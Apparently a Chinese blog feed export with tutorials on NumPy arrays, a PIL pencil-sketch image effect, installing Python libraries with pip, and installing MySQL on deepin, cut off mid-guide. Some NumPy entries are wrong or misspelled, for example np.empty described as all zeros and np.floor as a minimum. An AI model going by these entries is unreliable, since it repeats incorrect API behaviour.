align="center">描述</th></tr></thead><tbody><tr><td align="center">np.array([x,y,z],dtype=int)</td><td align="center">从Python列表和元组创造数组</td></tr><tr><td align="center">np.arange(x,y,i)</td><td align="center">创建一个由x到y，以i为步长的数组</td></tr><tr><td align="center">np.linspace(x,y,n)</td><td align="center">创建一个由x到y，等分成n个元素的数组</td></tr><tr><td align="center">np.indices((m,n))</td><td align="center">创建一个m行n列的矩阵</td></tr><tr><td align="center">np.random.rand(m,n)</td><td align="center">创建一个m行n列的随机数组</td></tr><tr><td align="center">np.ones((m,n),dtype)</td><td align="center">创建一个m行n列全1的数组，dtype是数据类型</td></tr><tr><td align="center">np.empty((m,n),dtype)</td><td align="center">创建一个m行n列全0的数组，dtype是数组类型</td></tr></tbody></table><p>（2）创建一个简单的数组后，可以查看ndarray类的基本属性，如下表所示</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">ndarray.ndim</td><td align="center">数组轴的个数，也被称作秩</td></tr><tr><td align="center">ndarray.shape</td><td align="center">数组在每个维度上大小的的整数元组</td></tr><tr><td align="center">ndarray.size</td><td align="center">数组元素的总个数</td></tr><tr><td align="center">ndarray.dtype</td><td align="center">数组元素的数据类型，dtype类型可用于创建数组</td></tr><tr><td align="center">ndarray.itemsize</td><td align="center">数组中每个元素的字节大小</td></tr><tr><td align="center">ndarray.data</td><td align="center">包含实际数组元素的缓冲区地址</td></tr><tr><td align="center">ndarray.flat</td><td align="center">数组元素的迭代器</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; a = np.ones((4,5))&gt;&gt;&gt; print(a)[[1. 1. 1. 1. 1.] [1. 1. 1. 1. 1.] [1. 1. 1. 1. 1.] [1. 1. 1. 1. 1.]]&gt;&gt;&gt; a.ndim2&gt;&gt;&gt; a.shape(4, 5)&gt;&gt;&gt; a.dtypedtype(&#39;float64&#39;)</code></pre><p>（3）数组在numpy中被当做对象，可以采用&lt;a&gt;.&lt;b&gt;()方式调用一些方法。下表给出了改变数组基础形态的操作方法，例如改变和调换数组维度等。其中，<strong>np.flatten()函数用于数组降维，相当于平铺数组中的数据，</strong>该功能在矩阵运算和图像处理中用处很大。</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">ndarray.reshape(n,m)</td><td align="center">不改变数组ndarray，返回一个维度为(n,m)的数组</td></tr><tr><td align="center">ndarray.resize(new_shape)</td><td align="center">与reshape()作用相同，直接修改ndarray</td></tr><tr><td align="center">ndarray.swqpaxes(ax1,ax2)</td><td align="center">将数组n个维度中任意两个维度进行调换</td></tr><tr><td align="center"><strong>ndarray.flatten()</strong></td><td align="center">对数组进行降维，返回一个折叠后的一维数组</td></tr><tr><td align="center">ndarray.ravel()</td><td align="center">作用通np.flatten(),但是返回数组的一个视图</td></tr></tbody></table><p>（4）下表给出了ndarray类的索引和切片方法。数组切片得到的是原始数组的视图，所有修改都会直接反映到源数组。如果需要得到ndarray切片的一份副本，需要进行复制操作，比如arange[5:8].copy()。</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">x[i]</td><td align="center">索引第i个元素</td></tr><tr><td align="center">x[-i]</td><td align="center">从后向前索引第i个元素</td></tr><tr><td align="center">x[n:m]</td><td align="center">默认步长为1，从前往后索引，不包含m</td></tr><tr><td align="center">x[-m:-n]</td><td align="center">默认步长为，从后往前索引，<strong>结束位置为n</strong>,(不是-n)</td></tr><tr><td align="center">x[n：m：i]</td><td align="center">指定i步长的由n到m的索引</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; a = np.random.rand(5,3)  #生成5*3的数组，用随机数填充&gt;&gt;&gt; a[2]  #获取第2行的数据array([0.31158762, 0.82371017, 0.73224191])&gt;&gt;&gt; a[1:3]array([[0.53039082, 0.14939241, 0.12996747],       [0.31158762, 0.82371017, 0.73224191]])&gt;&gt;&gt; a[-5:-2:2]array([[0.86506778, 0.97968013, 0.35782942],       [0.31158762, 0.82371017, 0.73224191]])&gt;&gt;&gt; print(a)[[0.86506778 0.97968013 0.35782942] [0.53039082 0.14939241 0.12996747] [0.31158762 0.82371017 0.73224191] [0.12440417 0.96267856 0.6107584 ] [0.3656373  0.35113364 0.08881953]]</code></pre><p><strong>注意</strong>：上例中，</p><ul><li>从前往后索引，依次为a[0]、a[1]、a[2]、a[3]、a[4]</li><li>从后往前索引，依次为a[-1]、a[-2]、a[-3]、a[-4]、a[-5]</li></ul><p>（5）除了ndarray类型方法外，numpy库提供了一批运算函数，如下表所示。这些函数中，输出参数y可选，如果没有指定，将创建并返回一个新的数组保存计算结果；如果指定参数，则将结果保存到参数中。</p><ul><li>例如，两个数组相加可以简单写为a+b，而np.add(a,b,a)则表示a+=b。</li></ul><table><thead><tr><th align="center">函数</th><th align="center">方法</th></tr></thead><tbody><tr><td align="center">np.add(x1,x2[,y])</td><td align="center">y = x1 + x2</td></tr><tr><td align="center">np.subtract(x1,x2[,y])</td><td align="center">y = x1 - x2</td></tr><tr><td align="center">np.multiply(x1,x2[,y])</td><td align="center">y = x1 * x2</td></tr><tr><td align="center">np.divide(x1,x2[,y])</td><td align="center">y = x1 / x2</td></tr><tr><td align="center">np floor_divide(x1,x2[,y])</td><td align="center">y = x1 // x2,返回值取整</td></tr><tr><td align="center">np.negative(x[,y])</td><td align="center">y = -x</td></tr><tr><td align="center">np.power(x1,x2[,y])</td><td align="center">y = x1 ** x2</td></tr><tr><td align="center">np.remainder(x1,x2[,y])</td><td align="center">y = x1 % x2</td></tr></tbody></table><p>（6）下表列出了numpy库的比较运算符，该表将返回一个布尔数组，它包含两个数组中对应元素值的比较结果。其中，where()函数是三元表达式x if condition else y的矢量版本。</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">np.equal(x1,x2[,y])</td><td align="center">y = x1 == x2</td></tr><tr><td align="center">np.not_equal(x1,x2[,y])</td><td align="center">y = x1 != x2</td></tr><tr><td align="center">np.less(x1,x2[,y])</td><td align="center">y = x1 &lt; x2</td></tr><tr><td align="center">np.less_equal(x1,x2[,y])</td><td align="center">y = x1 &lt;= x2</td></tr><tr><td align="center">np.greater(x1,x2[,y])</td><td align="center">y = x1 &gt; x2</td></tr><tr><td align="center">np.greater_equal(x1,x2[,y])</td><td align="center">y = x1 &gt;= x2</td></tr><tr><td align="center">np.where(condition[x,y])</td><td align="center">根据给出的条件判断输出x还是y</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt;import numpy as np&gt;&gt;&gt; np.less([1,2],[2,2])array([ True, False])</code></pre><p>（7）numpy的其他<strong>有趣而操作方便的函数</strong>，如下表所示</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">np.abs(x)</td><td align="center">计算基于元素的整型、浮点或复数的绝对值</td></tr><tr><td align="center">np.sqrt(x)</td><td align="center">计算每个元素的平方根</td></tr><tr><td align="center">np.squre(x)</td><td align="center">计算每个元素的平方</td></tr><tr><td align="center">np.sign(x)</td><td align="center">计算每个元素的符号：1(+)、0、-1(-)</td></tr><tr><td align="center">np.ceil(x)</td><td align="center">计算大于或等于每个元素的最小值</td></tr><tr><td align="center">np.floor(x)</td><td align="center">计算小于或等于每个元素的最小值</td></tr><tr><td align="center">np.rint(x[,out])</td><td align="center">圆整，取每个元素为最近的整数，保留数据类型</td></tr><tr><td align="center">np.exp(x[,out])</td><td align="center">计算每个元素的指数值</td></tr><tr><td align="center">np.log(x),np.log10(x),np.log2(x)</td><td align="center">计算自然对数(e)，基于10、2的对数，log(1+x)</td></tr></tbody></table><p>（8）numpy库还包括<strong>三角运算函数、傅里叶变换、随机和概率分布、基本数值统计、位运算、矩阵运算等非常丰富的功能</strong>。可在官网查询。</p><h2 id="图像的手绘效果"><a href="#图像的手绘效果" class="headerlink" title="图像的手绘效果"></a>图像的手绘效果</h2><p><strong>这是一个使用numpy和PIL库提取图像特征形成手绘效果的实例</strong></p><h3 id="图像的数组表示"><a href="#图像的数组表示" class="headerlink" title="图像的数组表示"></a>图像的数组表示</h3><p>（1）图像是有规则的二维数据，可以用numpy库将图像转换成数组对象。</p><pre><code class="python">&gt;&gt;&gt; from PIL import Image&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; im = np.array(Image.open(&#39;01.jpg&#39;))#open()中为图片存放路径，该路径不得出现中文。可用相对路径&gt;&gt;&gt; print(im.shape,im.dtype)(1711, 2560, 3) uint8</code></pre><p>（2）图像转换对应的ndarray类型是<strong>三维数据</strong>，如（881,1266,3），其中，前两维表示图像的<strong>长度和宽度</strong>，单位是<strong>像素</strong>，第三维表示每个像素点的<strong>RGB</strong>值，每个RGB值是一个单字节整数。</p><p>（3）PIL库包括图像转换函数，能够改变图像单个像素的表示形式。<strong>使用convert()函数，这是’L’模式，表示将像素从RGB的3字节形式转变为单一数值形式，这个数值范围为0~255，表示灰度色彩变化。</strong>此时，图像从彩色变为带有灰度的黑白色。<strong>转换后，图像的adarray类型变为二维数据，</strong>每个像素点色彩只由一个整数表示。</p><pre><code class="python">&gt;&gt;&gt; im = np.array(Image.open(&#39;01.jpg&#39;).convert(&#39;L&#39;))&gt;&gt;&gt; print(im.shape,im.dtype)(1711, 2560) uint8</code></pre><p>（4）通过对图像的数组转换，可以利用numpy访问图像上的任意像素值。例如，获取位于坐标(20,300)像素的颜色值或获取图像中最大和最小的像素值。也可以采用切片方式获取指定行或列的元素值，甚至修改这些值。</p><pre><code class="python">&gt;&gt;&gt; print(im[20,300])220&gt;&gt;&gt; print(int(im.min()),int(im.max()))0 255&gt;&gt;&gt; print(im[10,:])   #获取坐标x=10的所有像素点的值[246 246 246 ...  47  47  47]</code></pre><p>（5）<strong>将图像读入ndarray数组对象后，可以通过任意数学操作来获取相应的图像变换。</strong>以灰度变换为例，分别对灰度变化后的图像进行<strong>反变换、区间变化和像素值平方处理。</strong></p><ul><li>注意：有些数学变换会改变图像的数据类型，如变成整数类型等，所以在<strong>重新生成PIL图像前要先将数据类型通过numpy.uint()变换成整数。</strong></li></ul><pre><code class="python">&gt;&gt;&gt; from PIL import Image&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; im0 = np.array(Image.open(&#39;01.jpg&#39;).convert(&#39;L&#39;))&gt;&gt;&gt; im1 = 255 - im0     #反变换&gt;&gt;&gt; im2 = (100/255)*im0 + 150    #区间变换&gt;&gt;&gt; im3 = 255*(im1/255)**2       #像素平方处理&gt;&gt;&gt; pil_im = Image.fromarray(np.uint(im1))&gt;&gt;&gt; pil_im.show()&gt;&gt;&gt; pil_im = Image.fromarray(np.uint(im2))&gt;&gt;&gt; pil_im.show()&gt;&gt;&gt; pil_im = Image.fromarray(np.uint(im3))&gt;&gt;&gt; pil_im.show()</code></pre><ul><li>原图像</li></ul><p><img src="https://i.loli.net/2021/04/16/wxBbIqke2Yg39z5.png" alt="image-20210416153015688"></p><ul><li>对im1执行结果</li></ul><p><img src="https://i.loli.net/2021/04/16/ylFrb7gNPiwvZXx.png" alt="image-20210416153206984"></p><ul><li>对im2执行结果</li></ul><p><img src="https://i.loli.net/2021/04/16/VOraQjwLHiRk1PU.png" alt="image-20210416153347977"></p><ul><li>对im3执行结果</li></ul><p><img src="https://i.loli.net/2021/04/16/yq2GjIDdptJ4X6Z.png" alt="image-20210416153503923"></p><h3 id="扩展：灰度值"><a href="#扩展：灰度值" class="headerlink" title="扩展：灰度值"></a>扩展：灰度值</h3><p>（1）灰度值指黑白图像中点的颜色深度，范围从0到255，黑色为0，白色为255。因此，黑白图像也被称为灰度图像。</p><p>（2）RGB彩色图片可以通过如下公式转换成灰度值：</p><ul><li>Gray=R<em>0.3+G\</em>0.59+B*0.11</li></ul><h3 id="图像的手绘效果-1"><a href="#图像的手绘效果-1" class="headerlink" title="图像的手绘效果"></a>图像的手绘效果</h3><p>（1）获得铅笔画风格图像常采用ImageFilter.CONTOUR滤镜，它能够将图像的轮廓信息提取出来，但却缺乏立体感。可由程序给出图像的手绘效果，让图像更具立体感。</p><ul><li>图像轮廓</li></ul><p><img src="https://i.loli.net/2021/04/16/8WoF4DqVz1YsagP.png" alt="image-20210416160955896"></p><p>（2）为实现手绘风格，首先需要读取原图像的明暗变化，<strong>即灰度值。</strong></p><p>（3）从直观视觉感受上定义，图像灰度值显著变化的地方就是梯度，它描述了图像灰度变化的强度。</p><p>（4）通常可以使用梯度计算来提取图像轮廓，numpy中提供了直接获取灰度图像梯度的函数gradient()，传入图像数组表示即可返回代表x和y各自方向上梯度变化的二维元组。</p><pre><code class="python">from PIL import Imageimport numpy as npvec_el = np.pi/2.2      #光源的俯视角度，弧度值vec_az = np.pi/4.       #光源的方位角度，弧度值depth = 10.             #0-100im = Image.open(&#39;01.jpg&#39;).convert(&#39;L&#39;)a = np.asarray(im).astype(&#39;float&#39;)   #astype实现变量类型转换grad = np.gradient(a)   #取图像灰度的梯度值grad_x, grad_y = grad   #分别取横纵图像梯度值grad_x = grad_x*depth/100.grad_y = grad_y*depth/100.dx = np.cos(vec_el)*np.cos(vec_az) #光源对x轴的影响dy = np.cos(vec_el)*np.sin(vec_az) #光源对y轴的影响dz = np.sin(vec_el)                #光源对z轴的影响A = np.sqrt(grad_x**2 + grad_y**2 + 1.)uni_x = grad_x/Auni_y = grad_y/Auni_z = 1./Aa2 = 255*(dx*uni_x + dy*uni_y +dz*uni_z) #光源归一化a2 = a2.clip(0,255)im2 = Image.fromarray(a2.astype(&#39;uint8&#39;))#重构图像im2.save(&#39;fcityHandDraw.jpg&#39;)</code></pre><ul><li>手绘效果</li></ul><p><img src="https://i.loli.net/2021/04/16/faVxdl8psUnWJBe.png" alt="image-20210416160914116"></p><p>（5）手绘图像的基本思想是利用像素之间的梯度值（而不是像素本身）重构每个像素值。为了体现光照效果，<strong>设计一个光源，</strong>建立光源对各点梯度值的影响函数，进而运算出新的像素值，从而体现边界点灰度变化，形成手绘效果。</p><p>（6）为了更好的立体感，<strong>增加一个z方向梯度值</strong>，并给x和y方向梯度值赋权值depth。这种坐标空间变化相当于给物体加上一个虚拟光源，根据灰度值大小模拟各部分相对于人视角的远近程度，使画面显得有“深度”。</p><p>（7）在利用梯度重构图像时，对应不同梯度取0~255之间不同的灰度值，<strong>depth</strong>的作用在于调节这个对应关系。</p><ul><li>depth较小时，背景区域接近白色，画面显示轮廓描绘；</li><li>depth较大时，整体画面灰度值较深，近似于浮雕效果</li></ul><p>（8）将光源定义为3个参数：<strong>方位角vec_az、俯视角vec_el和深度权值depth</strong>。两个角度的设定和单位向量构成了基础的柱坐标系，体现物体相对于虚拟光源的位置。例如代码的第3行到第5行。</p><p>（9）通过<strong>np.gradient()函数</strong>计算图像梯度值作为新色彩计算的基础。为了更直观地进行计算，可以把角度对应的柱坐标转换为xyz立体坐标系。dx、dy、dz是像素点在施加模拟光源后在x、y、z方向上明暗变化的加权向量，如代码第12到第14行。</p><p>（10）A是梯度值，也是梯度大小。<strong>各个方向上总梯度除以幅值得到每个像素单元的梯度值</strong>。利用每个单元的梯度值和方向加权向量合成灰度值，<strong>clip函数用于预防溢出</strong>，并归一化到0~255区间。最后从数组中恢复图像并保存。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运用Python语言(二)-程序设计方法论02</title>
      <link href="2021/04/10/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%BA%8C)-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA02/"/>
      <url>2021/04/10/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%BA%8C)-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA02/</url>
      
        <content type="html"><![CDATA[<h2 id="计算生态和模块编程"><a href="#计算生态和模块编程" class="headerlink" title="计算生态和模块编程"></a>计算生态和模块编程</h2><p>（1）开源运动产生了深植于个信息技术领域的大量可重用资源，直接且有力地支撑了信息技术超越其他技术领域的发展速度，形成了“计算生态”。</p><p>（2）Python官方网站提供了第三方库索引功能（PyPI），网址：<a href="https://pypi.python.org/pypi">https://pypi.python.org/pypi</a></p><p>（3）上述网址列出了Python语言9万多个第三方库的基本信息，这些函数库覆盖信息领域技术所有技术方向。</p><p>（4）Python语言的函数库并非都采用Python语言编写，<strong>很多采用C、C++等语言编写的专业库可以经过简单的接口封装供Python语言程序调用。</strong></p><p>（5）Python语言的粘性功能使得它成为了各类编程语言之间的接口，<strong>Python语言也被称为“胶水语言”</strong></p><p>（6）模块编程主张利用开源代码和第三方库作为程序的部分或全部模块，像搭积木一样编写程序。</p><h2 id="Python第三方库的安装"><a href="#Python第三方库的安装" class="headerlink" title="Python第三方库的安装"></a>Python第三方库的安装</h2><p>（1）Python语言的标准库随Python安装包一起发布，用户可以随时使用，第三方库需要安装后才能使用。</p><p>（2）Python第三方库有3种安装方式：pip工具安装、自定义安装和文件安装</p><h3 id="pip工具安装"><a href="#pip工具安装" class="headerlink" title="pip工具安装"></a>pip工具安装</h3><p>（1）最常用且最高效的Python第三方库安装方式是采用pip工具安装。</p><p>（2）<strong>pip是Python官方提供并维护的在线第三方安装工具。</strong>对于同时安装python2和python3的系统，建议采用<strong>pip3</strong>命令专门为Python3版本安装第三方库。</p><p>（3）pip是Python内置命令，需要通过<strong>命令行执行</strong>，执行<strong>pip -h</strong>命令将列出pip常用的子命令。<strong>注意，不要在idle环境下运行pip程序。</strong></p><p>（4）pip支持安装（install）、下载（download）、卸载（uninstall）、列表（list）、查看（show）、查找（search）等一系列安装和维护子命令。</p><p>（5）安装一个库的命令格式如下：</p><pre><code>pip3 install &lt;拟安装库名&gt;例如：pip3 install pygame //安装pygame库，pip工具默认从网络上下载pygame库安装文件并自动安装到系统中。</code></pre><p>（6）使用 -U标签可以更新已安装库的版本，例如，用pip更新本身：</p><pre><code>pip3 install -U pip3实际在Windows下运行的命令：python -m pip install --upgrade pip</code></pre><p>（7）卸载一个库的命令格式如下：</p><pre><code>pip3 uninstall &lt;拟卸载库名&gt;例如：pip3 uninstall pygame //卸载pygame库，卸载过程可能需要用户确认。</code></pre><p>（8）<strong>可以通过list子命令列出当前系统中已安装的第三方库</strong>，例如：</p><pre><code>pip3 list运行结果：PS D:\Python\program\第六章&gt; pip3 listPackage                   Version------------------------- ---------altgraph                  0.17future                    0.18.2importlib-metadata        3.10.0jieba                     0.42.1pefile                    2019.4.18Pillow                    8.2.0pip                       21.0.1pyinstaller               4.2pyinstaller-hooks-contrib 2021.1pywin32-ctypes            0.2.0setuptools                40.6.2typing-extensions         3.7.4.3zipp                      3.4.1</code></pre><p>（9）pip的show子命令列出某个已经安装库的详细信息，例如：</p><pre><code>pip3 show &lt;拟查询库名&gt;例如：PS D:\Python\program\第六章&gt; pip3 show jiebaName: jiebaVersion: 0.42.1Summary: Chinese Words Segmentation UtilitiesHome-page: https://github.com/fxsjy/jiebaAuthor: Sun, JunyiAuthor-email: ccnusjy@gmail.comLicense: MITLocation: d:\python\lib\site-packagesRequires:Required-by:</code></pre><p>（10）pip的download子命令可以下载第三方库的安装包，但并不安装，例如：</p><pre><code>pip3 download &lt;拟下载库名&gt;</code></pre><p>（11）pip的search子命令可以联网搜索库名或摘要中的关键字，例如：</p><pre><code>pip3 search &lt;拟查询关键字&gt;</code></pre><p>（12）pip可以安装超过90%以上的第三方库。在Windows下，还有一些第三方库无法用pip安装，此时，需要其他的安装方法。而在Linux和Mac OS X等操作系统中，pip工具几乎可以安装任何第三方库。</p><h4 id="扩展：Windows下的pip换源"><a href="#扩展：Windows下的pip换源" class="headerlink" title="扩展：Windows下的pip换源"></a>扩展：Windows下的pip换源</h4><p>在C:\Users\86177路径下新建pip文件夹，在pip文件夹下新建文件pip.ini，在该文件中填入以下内容：</p><pre><code>[global]index-url = http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com</code></pre><h2 id="自定义安装"><a href="#自定义安装" class="headerlink" title="自定义安装"></a>自定义安装</h2><p>（1）自定义安装指按照第三方库提供的步骤和方式安装。<strong>第三方库都有主页用于维护库的代码和文档</strong>。以科学计算用的numpy为例，开发者的维护官方主页:<a href="http://www.numpy.org/">http://www.numpy.org/</a></p><p>（2）浏览网页后找到下载链接，进而根据提示步骤安装。<strong>自定义安装一般适合用于pip中尚无登记或安装失败的第三方库。</strong></p><h2 id="文件安装"><a href="#文件安装" class="headerlink" title="文件安装"></a>文件安装</h2><p>（1）由于Python某些第三方库仅提供源代码，通过pip下载文件后无法在Windows系统编译安装，会导致第三方库安装失败。<strong>在Windows平台下所遇到的无法安装第三方库的问题大多属于这类</strong>。</p><p>（2）为了解决无法安装的问题，美国加州大学尔湾分校提供了一个页面，帮助Python用户获得Windows可直接安装的第三方库文件。链地址：<a href="http://www.lfd.uci.edu/~gohlke/pythonlibs/">http://www.lfd.uci.edu/~gohlke/pythonlibs/</a></p><p>（3）该地址列出了一批在pip安装中可能出现问题的第三方库。以scipy为例，首先在页面上找到scipy库对应的内容。</p><p><img src="https://i.loli.net/2021/04/10/KFJ91dbGvkozIAH.png" alt="image-20210410185224213"></p><p>（4）选择其中的.whl文件下载，例如下载scipy-1.5.4-cp39-cp39-win_amd64.whl下载到该文件到D:\pycodes目录。然后，采用pip命令安装改文件。</p><pre><code>pip3 install D:\pycodes\scipy-1.5.4-cp39-cp39-win_amd64.whl</code></pre><h4 id="扩展：whl格式"><a href="#扩展：whl格式" class="headerlink" title="扩展：whl格式"></a>扩展：whl格式</h4><p>（1）whl是Python库的一种打包格式，用于通过pip进行安装，相当于Python库的安装包文件。</p><p>（2）whl文件本质上是一个压缩格式文件，可以通过该扩展名为zip查看其中的内容。</p><h2 id="pip安装脚本"><a href="#pip安装脚本" class="headerlink" title="pip安装脚本"></a>pip安装脚本</h2><p>（1）部分第三方库介绍</p><table><thead><tr><th align="center">库名</th><th align="center">用途</th><th align="center">pip安装指令</th></tr></thead><tbody><tr><td align="center">NumPy</td><td align="center">矩阵运算</td><td align="center">pip3 install numpy</td></tr><tr><td align="center">Matplotlib</td><td align="center">产品级2D图形绘制</td><td align="center">pip3 install matplotlib</td></tr><tr><td align="center">PIL</td><td align="center">图像处理</td><td align="center">pip3 install pillow</td></tr><tr><td align="center">sklearn</td><td align="center">机器学习和数据挖掘</td><td align="center">pip3 install sklearn</td></tr><tr><td align="center">Requests</td><td align="center">HTTP协议访问</td><td align="center">pip3 install requests</td></tr><tr><td align="center">Jieba</td><td align="center">中文分词</td><td align="center">pip3 install jieba</td></tr><tr><td align="center">Beautiful Soup或bs4</td><td align="center">HTML和XML解析</td><td align="center">pip3 install beautifulsoup4</td></tr><tr><td align="center">Wheel</td><td align="center">Python文件打包</td><td align="center">pip3 install wheel</td></tr><tr><td align="center">pyinstaller</td><td align="center">打包Python源文件为可执行文件</td><td align="center">pip3 install pyinstaller</td></tr><tr><td align="center">Django</td><td align="center">Python最流行的Web开发框架</td><td align="center">pip3 install django</td></tr><tr><td align="center">Flask</td><td align="center">轻量级Web开发框架</td><td align="center">pip3 install flask</td></tr><tr><td align="center">WeRoBot</td><td align="center">微信机器人开发框架</td><td align="center">pip3 install werobot</td></tr><tr><td align="center">Networkx</td><td align="center">复杂网络和图结构的建模和分析</td><td align="center">pip3 install networkx</td></tr><tr><td align="center">SymPy</td><td align="center">数学符号计算</td><td align="center">pip3 install sympy</td></tr><tr><td align="center">pandas</td><td align="center">高效数据分析</td><td align="center">pip3 install pandas</td></tr><tr><td align="center">PyQt5</td><td align="center">基于Qt的专业级GUI开发框架</td><td align="center">pip3 install pyqt5</td></tr><tr><td align="center">PyOpenGL</td><td align="center">多平台OpenGL开发接口</td><td align="center">pip3 install pyopengl</td></tr><tr><td align="center">PyPDF2</td><td align="center">PDF文件内容提取及处理</td><td align="center">pip3 install pypdf2</td></tr><tr><td align="center">docopt</td><td align="center">Python命令行解析</td><td align="center">pip3 install docopt</td></tr><tr><td align="center">PyGame</td><td align="center">简单小游戏开发框架</td><td align="center">pip3 install pygame</td></tr></tbody></table><p>（2）安装过程中，部分库会依赖其他函数库，pip会自动安装，部分库下载后需要一个安装过程，pip也会自动执行。</p><p>（3）可以使用Python标准库os的system()函数调用控制台。以下代码给出了采用pip<strong>批量安装</strong>Python库的方法。</p><pre><code class="python">import oslibs = &#123;&quot;numpy&quot;,&quot;matplotlib&quot;,&quot;sklearn&quot;,&quot;requests&quot;,\        &quot;beautifulsoup4&quot;,&quot;wheel&quot;,&quot;networkx&quot;,&quot;sympy&quot;,\        &quot;django&quot;,&quot;flask&quot;,&quot;werobot&quot;,&quot;pyqt5&quot;,&quot;pandas&quot;,\        &quot;pyopengl&quot;,&quot;pypdf2&quot;,&quot;docopt&quot;,&quot;pygame&quot;&#125;try:    for lib in libs:        os.system(&quot;pip3 install &quot;+lib)    print(&quot;Successful&quot;)except:    print(&quot;Failed Somehow&quot;)</code></pre><h2 id="You-Get"><a href="#You-Get" class="headerlink" title="You-Get"></a>You-Get</h2><p>（1）You-Get是一个基于Python3的视频下载工具，支持多数国内外主流视频站点的视频下载。（以下语句均在命令行执行）</p><p>（2）用pip工具安装You-Get库</p><pre><code>pip3 install you-get</code></pre><p>（3）常规下载</p><pre><code>you-get https://www.bilibili.com/video/BV17U4y1h7qF</code></pre><p>（4）不下载，仅查看视频信息</p><pre><code>you-get -i https://www.bilibili.com/video/BV17U4y1h7qF</code></pre><p>（5）将视频下载到指定位置，例如，Windows下保存到D盘根目录</p><pre><code>you-get -o D:/ https://www.bilibili.com/video/BV17U4y1h7qF</code></pre><p>注意：</p><ul><li>各大视频网站需要登录观看的视频无法直接下载</li><li>有些网站视频需要设置代理</li></ul><h2 id="Wordcloud"><a href="#Wordcloud" class="headerlink" title="Wordcloud"></a>Wordcloud</h2><pre><code class="python">import jiebaimport wordcloudexcludes = &#123;&quot;将军&quot;,&quot;却说&quot;,&quot;荆州&quot;,&quot;二人&quot;,&quot;不可&quot;,&quot;不能&quot;,&quot;如此&quot;,&quot;次日&quot;,&quot;大喜&quot;&#125;txt = open(&quot;三国演义.txt&quot;, &quot;r&quot;, encoding=&#39;utf-8&#39;).read()words = jieba.lcut(txt)counts = &#123;&#125;for word in words:    if len(word) == 1 :        continue    elif word==&quot;诸葛亮&quot; or word== &quot;孔明曰&quot;:        rword = &quot;孔明&quot;    elif word==&quot;关公&quot; or word==&quot;云长&quot;:        rword = &quot;关羽&quot;    elif word == &quot;玄德&quot; or word == &quot;玄德曰&quot;:        rword = &quot;刘备&quot;    elif word ==&quot;孟德&quot; or word == &quot;丞相&quot;:        rword = &quot;曹操&quot;    else:        rword = word    counts[rword] = counts.get(rword,0) + 1for word in excludes:    del(counts[word])items = list(counts.items())items.sort(key = lambda x:x[1], reverse=True)ls = []for i in range(20):    word,count=items[i]    #print (&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;.format(word,count))    ls.append(items[i][0])txt1 = &#39; &#39;.join(ls)w=wordcloud.WordCloud(width=1000,height=500,background_color=&#39;white&#39;,\                      max_words=20,font_path=&#39;msyh.ttc&#39;)w.generate(txt1)w.to_file(&#39;2.jpg&#39;)</code></pre><p><img src="https://i.loli.net/2021/04/10/IPpXBJv8ikF2ux9.png" alt="image-20210410232605044"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>deepin下安装MySQL</title>
      <link href="2021/04/09/deepin/deepin%E4%B8%8B%E5%AE%89%E8%A3%85MySQL/"/>
      <url>2021/04/09/deepin/deepin%E4%B8%8B%E5%AE%89%E8%A3%85MySQL/</url>
      
        <content type="html"><![CDATA[<h2 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h2><p>（1）MySQL官网：<a href="https://dev.mysql.com/downloads/mysql/">https://dev.mysql.com/downloads/mysql/</a></p><p>（2）选择Linux通用版本，64位，点击下载压缩包</p><p><img src="/home/fafusr/.config/Typora/typora-user-images/image-20210409154627533.png" alt="image-20210409154627533"></p><h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><pre><code>sudo tar -xvJf mysql-8.0.23-linux-glibc2.12-x86_64.tar.xz -C /usr/local</code></pre><h2 id="创建软连接"><a href="#创建软连接" class="headerlink" title="创建软连接"></a>创建软连接</h2><p>1.进入 /usr/local 目录</p><pre><code class="shell">cd /usr/local</code></pre><p>2.为 mysql-8.0.23-linux-glibc2.12-x86_64 目录创建软链接（方便操作）</p><pre><code class="shell">sudo ln -s mysql-8.0.23-linux-glibc2.12-x86_64 mysql</code></pre><h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h2><p>1.添加mysql用户组合mysql用户</p><pre><code>sudo groupadd mysqlsudo useradd -r -g mysql -s /bin/false mysql# -s /bin/false 参数指定mysql用户仅拥有所有权，而没有登陆权限</code></pre><p>2.进入安装mysql软件的目录</p><pre><code>cd /usr/local/mysql</code></pre><p>3.在/usr/local/mysql下建立data文件夹用于存放数据库文件</p><pre><code>sudo mkdir /usr/local/mysql/data</code></pre><p>4.在mysql目录下修改当前目录拥有者为新建的mysql用户</p><pre><code>sudo chown -R mysql:mysql ./</code></pre><p>5.安装mysql</p><pre><code>sudo ./bin/mysqld --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --initialize </code></pre><p>正常安装后会有这样一段话</p><pre><code>[Server] A temporary password is generated for root@localhost: sL:maY*3y6)d</code></pre><p>记下随机产生的密码(root@localhost:后面跟的所有字符就是密码 